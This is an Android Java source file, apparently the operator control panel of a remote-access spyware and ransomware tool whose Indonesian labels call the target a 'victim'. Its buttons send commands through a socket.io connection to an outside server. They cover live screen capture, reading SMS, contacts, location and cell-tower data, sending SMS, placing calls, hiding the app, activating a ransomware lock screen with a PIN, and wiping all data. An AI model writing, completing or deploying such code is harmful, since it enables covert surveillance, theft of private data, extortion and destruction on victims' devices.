package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private LinearLayout container;
    private ImageView liveScreenView;
    private Handler handler = new Handler();
    private boolean screenActive = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control);

        deviceId = getIntent().getStringExtra("deviceId");
        TextView title = findViewById(R.id.deviceTitle);
        title.setText("🎯 " + deviceId);
        container = findViewById(R.id.controlContainer);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {
            Toast.makeText(this, "Error socket", Toast.LENGTH_SHORT).show();
            return;
        }

        // === TOMBOL INSTAN ===
        addButton("🔦 Flashlight", () -> sendCmd("flashlight"));
        addButton("🔒 Lock Device", () -> {
            showInputDialog("PIN (optional)", pin -> {
                JSONObject p = new JSONObject();
                try { p.put("pin", pin); } catch (Exception e) {}
                sendCmd("lock", p);
            });
        });
        addButton("🔓 Unlock", () -> sendCmd("unlock"));
        addButton("🔇 Mute Volume", () -> sendCmd("mute"));
        addButton("📳 Vibrate", () -> {
            showInputDialog("Durasi (ms, contoh 1000)", dur -> {
                JSONObject p = new JSONObject();
                try { p.put("duration", Integer.parseInt(dur)); } catch (Exception e) {}
                sendCmd("vibrate", p);
            });
        });

        // === TOMBOL BUTUH INPUT ===
        addButton("🖼️ Change Wallpaper", () -> {
            showInputDialog("URL Gambar", url -> {
                JSONObject p = new JSONObject();
                try { p.put("url", url); } catch (Exception e) {}
                sendCmd("wallpaper", p);
            });
        });
        addButton("📞 Call", () -> {
            showInputDialog("Nomor Telepon", num -> {
                JSONObject p = new JSONObject();
                try { p.put("number", num); } catch (Exception e) {}
                sendCmd("call", p);
            });
        });
        addButton("💬 Send SMS", () -> {
            showTwoInputDialog("Nomor", "Pesan", (num, msg) -> {
                JSONObject p = new JSONObject();
                try { p.put("number", num); p.put("text", msg); } catch (Exception e) {}
                sendCmd("sms", p);
            });
        });
        addButton("📢 Toast", () -> {
            showInputDialog("Teks Toast", txt -> {
                JSONObject p = new JSONObject();
                try { p.put("text", txt); } catch (Exception e) {}
                sendCmd("toast", p);
            });
        });
        addButton("🔊 Speak (TTS)", () -> {
            showInputDialog("Teks Suara", txt -> {
                JSONObject p = new JSONObject();
                try { p.put("text", txt); } catch (Exception e) {}
                sendCmd("speak", p);
            });
        });
        addButton("🌐 Open URL", () -> {
            showInputDialog("URL", url -> {
                JSONObject p = new JSONObject();
                try { p.put("url", url); } catch (Exception e) {}
                sendCmd("openurl", p);
            });
        });
        addButton("📂 File Manager", () -> {
            showInputDialog("Path (kosongkan untuk /sdcard)", path -> {
                if (path.isEmpty()) path = "/sdcard";
                JSONObject p = new JSONObject();
                try { p.put("path", path); } catch (Exception e) {}
                sendCmd("list_files", p);
                Toast.makeText(this, "Meminta daftar file...", Toast.LENGTH_SHORT).show();
            });
        });

        // === LIVE SCREEN ===
        addButton("🖥️ Start Live Screen", () -> {
            sendCmd("start_screen");
            screenActive = true;
            if (liveScreenView == null) {
                liveScreenView = new ImageView(this);
                liveScreenView.setLayoutParams(new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT, 600));
                liveScreenView.setScaleType(ImageView.ScaleType.FIT_CENTER);
                liveScreenView.setBackgroundColor(0xFF000000);
                container.addView(liveScreenView);
            }
            Toast.makeText(this, "Memulai sadap layar...", Toast.LENGTH_SHORT).show();
        });
        addButton("⏹️ Stop Screen", () -> {
            sendCmd("stop_screen");
            screenActive = false;
            Toast.makeText(this, "Sadap layar dihentikan", Toast.LENGTH_SHORT).show();
        });

        // === RANSOMWARE ===
        addButton("🎭 Ransomware Activate", () -> {
            showTwoInputDialog("HTML", "PIN", (html, pin) -> {
                JSONObject p = new JSONObject();
                try { p.put("html", html); p.put("pin", pin); } catch (Exception e) {}
                sendCmd("ransomware_activate", p);
            });
        });
        addButton("🔓 Ransomware Deactivate", () -> sendCmd("ransomware_deactivate"));

        // === HIDE / UNHIDE APP ===
        addButton("👻 Hide App", () -> sendCmd("hide_app"));
        addButton("👁️ Unhide App", () -> sendCmd("unhide_app"));

        // === DESTROY ===
        addButton("💣 Wipe Data", () -> {
            new AlertDialog.Builder(this)
                .setTitle("Konfirmasi")
                .setMessage("Yakin hapus SEMUA data korban?")
                .setPositiveButton("Ya", (d, w) -> sendCmd("wipe"))
                .setNegativeButton("Batal", null)
                .show();
        });

        // === DATA HARVESTER ===
        addButton("📊 Dapatkan SMS", () -> requestData("get_sms"));
        addButton("👥 Kontak", () -> requestData("get_contacts"));
        addButton("📍 Lokasi", () -> requestData("get_location"));
        addButton("📶 Cell Tower", () -> requestData("get_celltower"));

        // Output data
        TextView fileOutput = new TextView(this);
        fileOutput.setTextColor(0xFF00ff41);
        fileOutput.setTextSize(12);
        fileOutput.setBackgroundColor(0xFF111111);
        fileOutput.setPadding(16,16,16,16);
        container.addView(fileOutput);
    }

    private void requestData(String type) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", type);
                msg.put("params", new JSONObject());
                socket.emit("command", msg);
                Toast.makeText(this, "Meminta " + type, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        }
    }

    private void addButton(String text, Runnable action) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackgroundColor(0xFF222222);
        btn.setOnClickListener(v -> action.run());
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        params.setMargins(0, 0, 0, 12);
        btn.setLayoutParams(params);
        container.addView(btn);
    }

    private void sendCmd(String cmd) {
        sendCmd(cmd, new JSONObject());
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "Perintah " + cmd + " dikirim", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "Socket tidak terhubung", Toast.LENGTH_SHORT).show();
        }
    }

    private void showInputDialog(String title, InputCallback callback) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        EditText input = new EditText(this);
        builder.setView(input);
        builder.setPositiveButton("OK", (d, w) -> callback.onInput(input.getText().toString()));
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    private void showTwoInputDialog(String title1, String title2, TwoInputCallback callback) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        EditText e1 = new EditText(this); e1.setHint(title1);
        EditText e2 = new EditText(this); e2.setHint(title2);
        layout.addView(e1);
        layout.addView(e2);
        builder.setView(layout);
        builder.setPositiveButton("OK", (d, w) -> callback.onInput(e1.getText().toString(), e2.getText().toString()));
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    interface InputCallback { void onInput(String input); }
    interface TwoInputCallback { void onInput(String input1, String input2); }
}
